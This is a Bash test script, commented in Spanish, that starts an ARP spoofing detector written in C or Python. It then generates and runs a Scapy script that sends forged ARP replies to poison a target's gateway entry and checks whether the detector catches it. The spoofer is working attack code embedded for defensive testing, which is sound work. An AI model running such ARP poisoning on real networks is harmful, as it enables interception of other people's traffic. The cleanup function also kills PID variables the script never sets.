#!/bin/bash

# Función para limpiar y salir
cleanup() {
    echo "Limpiando y saliendo..."
    sudo kill $PYTHON_SPOOF_PID
    [ ! -z "$PYTHON_DETECT_PID" ] && sudo kill $PYTHON_DETECT_PID
    [ ! -z "$C_DETECT_PID" ] && sudo kill $C_DETECT_PID
    exit
}

# Configurar trap para SIGINT (Ctrl+C)
trap cleanup SIGINT

# Verificar dependencias de Python
if ! command -v python3 &> /dev/null; then
    echo "Python 3 no está instalado."
    exit 1
fi

if ! python3 -c "import scapy" &> /dev/null; then
    echo "Scapy no está instalado. Instálalo con: pip install scapy"
    exit 1
fi

# Verificar dependencias de C
if ! command -v gcc &> /dev/null; then
    echo "gcc no está instalado."
    exit 1
fi

if ! command -v pcap-config &> /dev/null; then
    echo "libpcap no está instalado. Instálalo con: brew install libpcap"
    exit 1
fi

# Seleccionar el detector a usar
echo "Selecciona el detector a usar:"
echo "1. Python"
echo "2. C"
read -p "Ingrese el número de su elección: " DETECTOR_CHOICE

if [ "$DETECTOR_CHOICE" -eq 2 ]; then
    read -p "Ingrese el nombre de la interfaz de red: " INTERFACE
    gcc -o arp_spoofing_detector arp_spoofing_detector.c -lpcap
    sudo ./arp_spoofing_detector $INTERFACE &
    DETECT_PID=$!
else
    read -p "Ingrese el nombre de la interfaz de red: " INTERFACE
    sudo python3 arp_spoofing_detector.py $INTERFACE &
    DETECT_PID=$!
fi

# Espera un momento para que el detector se inicie
sleep 5

# Crea un script Python simple para el ARP spoofing
cat << EOF > arp_spoofer.py
from scapy.all import send, ARP, getmacbyip
import time

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    arp_reply = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')

    print(f"Iniciando ARP spoofing contra {target_ip}")
    for _ in range(50):  # Envía 50 paquetes
        send(arp_reply, verbose=False)
        time.sleep(0.2)
    print("ARP spoofing finalizado")

# Reemplaza estas IP con las de tu red local
arp_spoof("192.168.1.2", "192.168.1.1")
EOF

# Inicia el ataque ARP spoofing
echo "Iniciando ataque ARP spoofing..."
sudo python3 arp_spoofer.py &
PYTHON_SPOOF_PID=$!

# Espera a que el ataque termine
wait $PYTHON_SPOOF_PID

# Espera un momento más para ver si el detector lo registra
sleep 5

# Detén el detector
sudo kill $DETECT_PID

echo "Prueba completada. Revisa los logs para ver si se detectó el ataque."

# Limpia los archivos temporales
rm arp_spoofer.py arp_spoofing_detector